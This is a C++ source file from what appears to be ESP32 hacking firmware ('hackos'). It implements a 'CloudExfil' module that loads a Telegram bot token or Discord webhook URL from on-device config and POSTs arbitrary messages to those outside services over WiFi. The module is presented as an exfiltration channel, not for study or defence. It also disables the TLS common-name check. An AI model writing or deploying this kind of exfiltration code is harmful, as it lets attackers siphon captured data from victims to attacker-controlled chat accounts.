/**
 * @file cloud_exfil.cpp
 * @brief Cloud exfiltration implementation – Telegram / Discord webhooks.
 */

#include "net/cloud_exfil.h"

#include <cstdio>
#include <cstring>

#include <WiFi.h>
#include <esp_http_client.h>
#include <esp_log.h>
#include <esp_tls.h>

#include "storage/vfs.h"

static constexpr const char *TAG_CLOUD = "CloudExfil";

namespace hackos::net {

// ── Singleton ────────────────────────────────────────────────────────────────

CloudExfil &CloudExfil::instance()
{
    static CloudExfil exfil;
    return exfil;
}

CloudExfil::CloudExfil()
    : type_(WebhookType::NONE),
      token_{0},
      chatId_{0},
      webhookUrl_{0},
      configured_(false)
{
}

// ── Public API ──────────────────────────────────────────────────────────────

bool CloudExfil::loadConfig()
{
    configured_ = false;
    type_ = WebhookType::NONE;

    auto &vfs = hackos::storage::VirtualFS::instance();
    fs::File f = vfs.open(CONFIG_PATH, "r");
    if (!f)
    {
        ESP_LOGW(TAG_CLOUD, "No config at %s", CONFIG_PATH);
        return false;
    }

    while (f.available())
    {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() == 0U || line[0] == '#')
        {
            continue;
        }

        const int eq = line.indexOf('=');
        if (eq < 0)
        {
            continue;
        }

        String key = line.substring(0, eq);
        String val = line.substring(eq + 1);
        key.trim();
        val.trim();

        if (key == "TYPE")
        {
            if (val == "TELEGRAM")
            {
                type_ = WebhookType::TELEGRAM;
            }
            else if (val == "DISCORD")
            {
                type_ = WebhookType::DISCORD;
            }
        }
        else if (key == "TOKEN")
        {
            std::strncpy(token_, val.c_str(), MAX_TOKEN_LEN);
            token_[MAX_TOKEN_LEN] = '\0';
        }
        else if (key == "CHAT_ID")
        {
            std::strncpy(chatId_, val.c_str(), MAX_CHAT_ID);
            chatId_[MAX_CHAT_ID] = '\0';
        }
        else if (key == "WEBHOOK")
        {
            std::strncpy(webhookUrl_, val.c_str(), MAX_URL_LEN);
            webhookUrl_[MAX_URL_LEN] = '\0';
        }
    }
    f.close();

    if (type_ == WebhookType::TELEGRAM && token_[0] != '\0' && chatId_[0] != '\0')
    {
        configured_ = true;
    }
    else if (type_ == WebhookType::DISCORD && webhookUrl_[0] != '\0')
    {
        configured_ = true;
    }

    ESP_LOGI(TAG_CLOUD, "Config loaded: type=%u configured=%s",
             static_cast<unsigned>(type_), configured_ ? "yes" : "no");
    return configured_;
}

bool CloudExfil::send(const char *message)
{
    if (!configured_ || message == nullptr || message[0] == '\0')
    {
        return false;
    }

    if (WiFi.status() != WL_CONNECTED)
    {
        ESP_LOGW(TAG_CLOUD, "WiFi not connected – cannot send");
        return false;
    }

    char url[384];
    char postData[512];

    // Escape special JSON characters in the message.
    char escaped[256];
    size_t ei = 0U;
    for (size_t mi = 0U; message[mi] != '\0' && ei < sizeof(escaped) - 2U; ++mi)
    {
        const char ch = message[mi];
        if (ch == '"' || ch == '\\')
        {
            escaped[ei++] = '\\';
        }
        else if (ch == '\n')
        {
            escaped[ei++] = '\\';
            escaped[ei++] = 'n';
            continue;
        }
        escaped[ei++] = ch;
    }
    escaped[ei] = '\0';

    if (type_ == WebhookType::TELEGRAM)
    {
        std::snprintf(url, sizeof(url),
                      "https://api.telegram.org/bot%s/sendMessage", token_);
        std::snprintf(postData, sizeof(postData),
                      "{\"chat_id\":\"%s\",\"text\":\"%s\"}", chatId_, escaped);
    }
    else if (type_ == WebhookType::DISCORD)
    {
        std::strncpy(url, webhookUrl_, sizeof(url) - 1U);
        url[sizeof(url) - 1U] = '\0';
        std::snprintf(postData, sizeof(postData),
                      "{\"content\":\"%s\"}", escaped);
    }
    else
    {
        return false;
    }

    esp_http_client_config_t config{};
    config.url = url;
    config.method = HTTP_METHOD_POST;
    config.timeout_ms = 5000;
    // Note: CN check disabled because ESP32 has no built-in CA bundle.
    // For improved security, embed the specific root CA certificate.
    config.skip_cert_common_name_check = true;

    esp_http_client_handle_t client = esp_http_client_init(&config);
    if (client == nullptr)
    {
        ESP_LOGE(TAG_CLOUD, "Failed to init HTTP client");
        return false;
    }

    esp_http_client_set_header(client, "Content-Type", "application/json");
    esp_http_client_set_post_field(client, postData,
                                   static_cast<int>(std::strlen(postData)));

    const esp_err_t err = esp_http_client_perform(client);
    const int status = esp_http_client_get_status_code(client);
    esp_http_client_cleanup(client);

    if (err != ESP_OK)
    {
        ESP_LOGE(TAG_CLOUD, "HTTP POST failed: %s", esp_err_to_name(err));
        return false;
    }

    ESP_LOGI(TAG_CLOUD, "HTTP POST status=%d", status);
    return (status >= 200 && status < 300);
}

WebhookType CloudExfil::type() const
{
    return type_;
}

bool CloudExfil::isConfigured() const
{
    return configured_;
}

} // namespace hackos::net
